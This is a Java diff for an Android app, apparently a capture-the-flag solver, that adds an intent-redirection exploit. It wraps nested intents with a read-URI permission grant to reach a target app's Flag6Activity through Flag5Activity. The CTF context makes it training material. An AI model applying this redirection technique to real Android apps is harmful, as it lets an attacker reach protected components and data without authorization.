@@ -35,7 +35,7 @@ public class MainActivity extends AppCompatActivity {
             @Override
             public void onClick(View v) {
                 homeText.setText(" text changes after button click");
-                flag5Solution();
+                flag6Solution();
             }
         });
     }
@@ -74,13 +74,34 @@ public class MainActivity extends AppCompatActivity {
 
         Intent intent2 = new Intent();
         intent2.setComponent(new ComponentName(packageName,packageName+".activities.Flag5Activity"));
+        intent2.putExtra("return",42);
         intent2.putExtra("nextIntent", intent3);
-
 
         Intent intent = new Intent();
         intent.setComponent(new ComponentName(packageName,packageName+".activities.Flag5Activity"));
         intent.putExtra("android.intent.extra.INTENT",intent2);
         startActivity(intent);
 
+    }
+
+    private void flag6Solution(){
+//        Intent in intent but intent redirection rather.
+
+//        should point to the component you want to redirect to.
+        Intent intent3 = new Intent();
+        intent3.setComponent(new ComponentName(packageName,packageName+".activities.Flag6Activity"));
+        intent3.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
+        intent3.putExtra("reason","next");
+
+        Intent intent2 = new Intent();
+        intent2.setComponent(new ComponentName(packageName,packageName+".activities.Flag5Activity"));
+        intent2.putExtra("return",42);
+        intent2.putExtra("nextIntent", intent3);
+
+        Intent intent = new Intent();
+        intent.setComponent(new ComponentName(packageName,packageName+".activities.Flag5Activity"));
+        intent.putExtra("android.intent.extra.INTENT",intent2);
+        Log.i("Intent Redirection",Utils.dumpIntent(this,intent));
+        startActivity(intent);
     }
 }
